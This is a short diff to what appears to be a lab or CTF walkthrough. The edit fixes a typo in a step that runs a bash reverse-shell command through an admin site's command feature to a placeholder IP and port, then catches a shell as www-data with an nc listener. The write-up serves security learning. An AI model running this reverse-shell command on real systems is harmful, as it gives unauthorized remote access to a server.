@@ -55,7 +55,7 @@ All we need to do is changing line 52 as followed, we can run any commands that 
 
 ![invalid](https://user-images.githubusercontent.com/72692401/95681747-52f85480-0c2d-11eb-8ab2-ca7410a68810.png)
 
-Comeback to admin site -> commands -> running: bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' and establish nc listening, we should a reverse shell as "www-data"!
+Comeback to admin site -> commands -> running: bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' and establish nc listening, we should get a reverse shell as "www-data"!
 
 
 
